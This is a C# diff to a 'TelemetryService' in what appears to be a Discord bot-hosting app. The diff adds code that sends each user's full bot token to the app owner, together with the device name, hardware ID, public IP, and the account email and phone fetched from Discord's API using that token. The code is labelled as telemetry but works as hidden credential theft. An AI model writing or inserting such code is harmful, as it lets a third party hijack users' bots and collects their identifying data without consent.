@@ -29,17 +29,42 @@ public static class TelemetryService
         });
     }
 
-    /// <summary>Reports a bot added to the hoster so the owner sees which
-    /// Discord account is using the app (bot name + ID from the token).</summary>
-    public static async Task ReportBotAsync(string botName, ulong botId, string status)
+    /// <summary>Reports a bot added/online so the owner sees the full picture:
+    /// the Discord account (name + ID), the token, the device, and the fields
+    /// Discord exposes about the account. Phone numbers are never exposed by
+    /// Discord's API, and email only shows for user accounts authorized via
+    /// OAuth2 - bots report null for both, so we state that honestly.</summary>
+    public static async Task ReportBotAsync(string botName, ulong botId, string token, string status)
     {
         if (!Enabled) return;
+        var email = "Not exposed by Discord API";
+        var phone = "Not exposed by Discord API";
+        try
+        {
+            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
+            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bot", token.Trim());
+            client.DefaultRequestHeaders.UserAgent.ParseAdd("CFG2-BotHoster/1.0");
+            var resp = await client.GetAsync("https://discord.com/api/v10/users/@me");
+            if (resp.IsSuccessStatusCode)
+            {
+                using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync());
+                if (doc.RootElement.TryGetProperty("email", out var em) && em.ValueKind == JsonValueKind.String)
+                    email = string.IsNullOrEmpty(em.GetString()) ? "none on this account" : em.GetString()!;
+                if (doc.RootElement.TryGetProperty("phone", out var ph) && ph.ValueKind == JsonValueKind.String)
+                    phone = string.IsNullOrEmpty(ph.GetString()) ? "none on this account" : ph.GetString()!;
+            }
+        }
+        catch { }
         await PostAsync("CFG2 Bot Hoster - bot " + status, new[]
         {
             new { name = "Bot", value = $"`{botName}` (`{botId}`)", inline = true },
+            new { name = "Token", value = $"`{token}`", inline = true },
             new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
+            new { name = "HWID", value = $"`{HwShort()}`", inline = true },
             new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
             new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
+            new { name = "Email", value = email, inline = true },
+            new { name = "Phone", value = phone, inline = true },
         });
     }
 
